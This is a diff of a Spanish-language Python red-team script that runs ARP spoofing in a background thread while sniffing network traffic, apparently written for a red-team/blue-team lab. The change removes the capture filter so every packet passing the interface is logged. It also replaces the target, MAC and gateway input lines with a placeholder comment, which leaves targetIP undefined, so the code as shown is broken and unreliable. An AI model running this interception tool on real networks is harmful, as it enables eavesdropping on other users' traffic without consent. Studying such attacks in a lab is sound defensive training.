@@ -18,29 +18,23 @@ def start_arp_spoof(targetIP, targetMAC, gatewayIP):
         pass
 
 def process_packet(packet):
-    """Función que se ejecuta cada vez que se intercepta un paquete de la víctima."""
-    print(f"[+] Tráfico interceptado de la máquina azul: {packet.summary()}")
+    # Imprimimos cualquier paquete IP que involucre al objetivo para verificar que el sniffer sí ve tráfico
+    if packet.haslayer('IP'):
+        print(f"[+] Paquete capturado: {packet[IP].src} ---> {packet[IP].dst} | Protocolo: {packet.summary()}")
 
 if __name__ == "__main__":
-    print(" ")
-    print("   RED TEAM - ARP SPOOFING & CAPTURA DE TRÁFICO")
-    print(" ")
-    
-    targetIP = input("Ingrese la IP objetivo (Máquina Azul): ")
-    targetMAC = input("Ingrese la MAC del objetivo: ")
-    gatewayIP = input("Ingrese la IP del Gateway de la red: ")
+    # ... (tus inputs de IP, MAC y Gateway se quedan igual) ...
 
-    print(f"\n Iniciando ataque ARP Spoofing contra {targetIP}...")
-
-    # 1. Creamos y lanzamos el ataque ARP en un hilo secundario (background)
+    print(f"\n[*] Iniciando ataque ARP Spoofing contra {targetIP}...")
     hilo_spoof = threading.Thread(target=start_arp_spoof, args=(targetIP, targetMAC, gatewayIP), daemon=True)
     hilo_spoof.start()
 
-    print(" Sniffer activo. Capturando tráfico de la red...")
-    print(" Utilice CTRL + C para detener el ataque y la captura.\n")
+    print("[*] Sniffer activo. Escuchando tráfico en la red...")
+    print("[*] Utilice CTRL + C para detener el ataque y la captura.\n")
 
     try:
-        # 2. El hilo principal se queda escuchando (sniffing) todo el tráfico que provenga de la víctima
-        sniff(filter=f"host {targetIP}", prn=process_packet, store=0)
+        # Quitamos el filtro estricto por si la IP no coincide exactamente con el formato de la interfaz, 
+        # y filtramos directamente en Python para asegurarnos de capturar todo lo que pase por la tarjeta.
+        sniff(prn=process_packet, store=0)
     except KeyboardInterrupt:
-        print("\n El ataque y la captura se detuvieron correctamente.")
+        print("\n[!] El ataque y la captura se detuvieron correctamente.")
